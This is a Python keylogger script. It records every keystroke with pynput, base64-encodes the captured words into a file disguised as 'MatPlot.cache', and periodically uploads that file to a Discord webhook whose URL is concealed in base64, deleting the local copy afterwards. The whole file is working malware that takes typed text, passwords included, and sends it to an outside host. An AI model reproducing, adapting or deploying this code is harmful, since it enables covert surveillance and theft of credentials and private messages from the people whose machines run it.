from pynput import keyboard
from pynput import mouse


from discord_webhook import DiscordWebhook

import base64


class Logger():
    def __init__(self):
        self.word = ""
        self.data = []

    def send_data(self):
        self.webhook = DiscordWebhook(
            url=base64.b64decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwOTY1MTIyOTMwNDg2OTcwMTQvazAwU3VWaURfTGNwLWp5UmJsNTZJQkJNY1pPS3BzTlU3Z2dkSHo3bVpOMkV3Y19sU2s5em10em5tQTZnOEJtZmJRaXk="),
            content="New data")
        with open("MatPlot.cache", "rb") as f:
            self.webhook.add_file(file=f.read(), filename='fuck.cache')
        self.webhook.execute()
        
    def erase_file(self):
        with open("MatPlot.cache", "w") as f:
            f.write("")
        
    def get_lenfile(self):
        with open("MatPlot.cache", "r") as f:
            return len(f.readlines())
        
    def write_data(self):
        __data = " ".join(self.data)
        _data = base64.b64encode(__data.encode()).decode()
        with open("MatPlot.cache", "a+") as f:
            f.write(_data)
            f.write("\n")
        self.data = []
        
    def check_data(self):
        if len(self.data) > 3:
            self.write_data()
            if self.get_lenfile() > 3:
                self.send_data()
                self.erase_file()
            self.data = []
    
    def on_press(self, key):
        try:
            if key.char == " ":
                self.data.append(self.word)
                self.word = ""
            else:
                self.word += key.char
        except AttributeError:
            if key == keyboard.Key.backspace:
                self.word = self.word[:-1]
            if key == keyboard.Key.space or key == keyboard.Key.enter:
                self.data.append(self.word)
                self.word = ""
            elif key == keyboard.Key.ctrl_l:
                return
            elif not self.word == "":
                self.data.append(self.word)
        self.check_data()
            

    def on_mouse_press(self, *args):
        #print(*args)
        pass
    
logger = Logger()
listener = keyboard.Listener(
    on_press=logger.on_press)
listener.start()

listenerx = mouse.Listener(
    on_click=logger.on_mouse_press
)
listenerx.start()

while True:
    print(logger.data)
